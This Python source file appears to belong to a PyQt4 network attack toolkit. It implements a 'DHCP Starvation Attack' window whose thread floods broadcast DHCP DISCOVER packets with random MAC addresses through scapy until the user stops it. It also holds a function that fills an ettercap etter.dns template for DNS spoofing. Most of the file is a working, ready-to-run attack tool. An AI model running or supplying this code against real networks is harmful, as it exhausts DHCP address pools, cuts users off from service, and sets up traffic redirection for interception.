from PyQt4.QtGui import *
from scapy.all import *
import threading
from os import system,popen,getegid
from re import search
from Core.Settings import frm_Settings
from platform import dist
import time
from subprocess import Popen,PIPE

class frm_dhcp_main(QMainWindow):
    def __init__(self, parent=None):
        super(frm_dhcp_main, self).__init__(parent)
        self.form_widget = frm_dhcp_Attack(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("DHCP Starvation Attack")
        self.setWindowIcon(QIcon('rsc/icon.ico'))

        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        if theme != "theme2":
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())
        else:
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())

class frm_dhcp_Attack(QWidget):
    def __init__(self, parent=None):
        super(frm_dhcp_Attack, self).__init__(parent)
        self.Main = QVBoxLayout()
        self.control = None
        self.GUI()
    def GUI(self):
        self.form = QFormLayout()
        self.list_log = QListWidget()
        self.check = QLabel("")
        self.check.setText("[ OFF ]")
        self.check.setStyleSheet("QLabel {  color : red; }")
        self.btn_Start_attack = QPushButton("Start Attack",self)
        self.btn_Stop_attack = QPushButton("Stop Attack",self)

        self.btn_Start_attack.clicked.connect(self.D_attack)
        self.btn_Stop_attack.clicked.connect(self.kill_thread)

        self.btn_Start_attack.setIcon(QIcon("rsc/start.png"))
        self.btn_Stop_attack.setIcon(QIcon("rsc/Stop.png"))

        self.form.addRow(self.list_log)
        self.form.addRow("Status Attack:",self.check)
        self.form.addRow(self.btn_Start_attack, self.btn_Stop_attack)
        self.Main.addLayout(self.form)
        self.setLayout(self.Main)

    def D_attack(self):
        if not getegid() == 0:
            QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
        else:
            self.control = None
            interface = self.get_card()
            if interface != None:
                self.check.setText("[ ON ]")
                self.check.setStyleSheet("QLabel {  color : green; }")
                self.t = threading.Thread(target=self.discover_attacker)
                self.t.daemon = True
                self.t.start()
            else:
                QMessageBox.information(self, "Interface Not found", 'None detected network interface try again.')
    def attack_OFF(self):
        self.check.setText("[ OFF ] Packet sent: " + str(self.count))
        self.check.setStyleSheet("QLabel {  color : red; }")
        system("clear")
    def discover_attacker(self):
        interface = self.get_card()
        self.count =0
        while self.control == None:
            conf.checkIPaddr = False
            dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
            sendp(dhcp_discover)
            self.count +=1
            self.list_log.addItem("PacketSend:[%s] DISCOVER Interface: %s "%(self.count,interface) + time.strftime("%c"))
            if self.control == 1:
                self.attack_OFF()
    def get_card(self):
        output = popen("route | grep default").read().split()
        if len(output) > 0:
            return output[7]
        else:
            return None

    def kill_thread(self):
        self.control = 1
        self.list_log.clear()


    def placa(self):
        comando = "ls -1 /sys/class/net"
        proc = Popen(comando,stdout=PIPE, shell=True)
        data = proc.communicate()[0]
        return  data.split('\n')


    def get_ip_local(self,card):
        dect = None
        if not card != None:
            get_interface = self.get_card()
            out = popen("ifconfig %s | grep 'Bcast'"%(get_interface)).read().split()
            for i in out:
                if search("end",i):
                    if len(out) > 0:
                        ip = out[2].split(":")
                        return ip[0]
            if len(out) > 0:
                ip = out[1].split(":")
                return ip[1]
        else:
            out = popen("ifconfig %s | grep 'Bcast'"%(card)).read().split()
            for i in out:
                if search("end",i):
                    if len(out) > 0:
                        ip = out[2].split(":")
                        return ip[0]
            if len(out) > 0:
                ip = out[1].split(":")
                return ip[1]
        return None

def conf_etter(data):
        text = ("""############################################################################
#                                                                          #
#  ettercap -- etter.dns -- host file for dns_spoof plugin                 #
#                                                                          #
#  Copyright (C) ALoR & NaGA                                               #
#                                                                          #
#  This program is free software; you can redistribute it and/or modify    #
#  it under the terms of the GNU General Public License as published by    #
#  the Free Software Foundation; either version 2 of the License, or       #
#  (at your option) any later version.                                     #
#                                                                          #
############################################################################
#                                                                          #
# Sample hosts file for dns_spoof plugin                                   #
#                                                                          #
# the format is (for A query):                                             #
#   www.myhostname.com A 168.11.22.33                                      #
#   *.foo.com          A 168.44.55.66                                      #
#                                                                          #
# or for PTR query:                                                        #
#   www.bar.com A 10.0.0.10                                                #
#                                                                          #
# or for MX query:                                                         #
#    domain.com MX xxx.xxx.xxx.xxx                                         #
#                                                                          #
# or for WINS query:                                                       #
#    workgroup WINS 127.0.0.1                                              #
#    PC*       WINS 127.0.0.1                                              #
#                                                                          #
# NOTE: the wildcarded hosts can't be used to poison the PTR requests      #
#       so if you want to reverse poison you have to specify a plain       #
#       host. (look at the www.microsoft.com example)                      #
#                                                                          #
############################################################################

################################
# microsoft sucks ;)
# redirect it to www.linux.org

#microsoft.com      A   198.182.196.56
#*.microsoft.com    A   198.182.196.56
#www.microsoft.com  PTR 198.182.196.56      # Wildcards in PTR are not allowed

%s


##########################################
# no one out there can have our domains...
#

www.alor.org  A 127.0.0.1
www.naga.org  A 127.0.0.1

###############################################
# one day we will have our ettercap.org domain
#

www.ettercap.org           A  127.0.0.1
ettercap.sourceforge.net   A  216.136.171.201

###############################################
# some MX examples
#

alor.org   MX  127.0.0.1
naga.org   MX  127.0.0.1

###############################################
# This messes up NetBIOS clients using DNS
# resolutions. I.e. Windows/Samba file sharing.
#

LAB-PC*  WINS  127.0.0.1

# vim:ts=8:noexpandtab"""%(data))
        return text